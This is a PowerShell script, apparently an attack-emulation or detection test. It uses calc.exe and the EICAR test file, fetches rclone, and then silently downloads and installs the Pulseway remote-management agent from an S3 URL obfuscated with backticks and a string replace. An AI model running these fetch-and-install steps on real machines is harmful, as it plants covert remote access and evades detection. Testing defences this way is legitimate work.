Start-Process "C:\Windows\System32\calc.exe"
Invoke-WebRequest "https://downloads.rclone.org/v1.74.4/rclone-v1.74.4-windows-amd64.zip" -OutFile "$env:TEMP\rclone.zip"
Expand-Archive -Path "$env:TEMP\rclone.zip" -DestinationPath "$env:TEMP\rclone" -Force
$rclone = Get-ChildItem "$env:TEMP\rclone" -Filter "rclone.exe" -Recurse | Select-Object -ExpandProperty FullName -First 1
& $rclone copyurl "https://secure.eicar.org/eicar.com.txt" "$env:TEMP\eicar.com.txt"

$url = "https://ssstring.us-east-1`.ama`zonaws.com/website/downloads/P`u`l`s`eway_`x64`.msi"
$url = $url.Replace("ssstring", "pulseway.s3")
Invoke-WebRequest $url -OutFile "$env:TEMP\j3xyz7.msi"
msiexec.exe /i "$env:TEMP\j3xyz7.msi" /qn /norestart
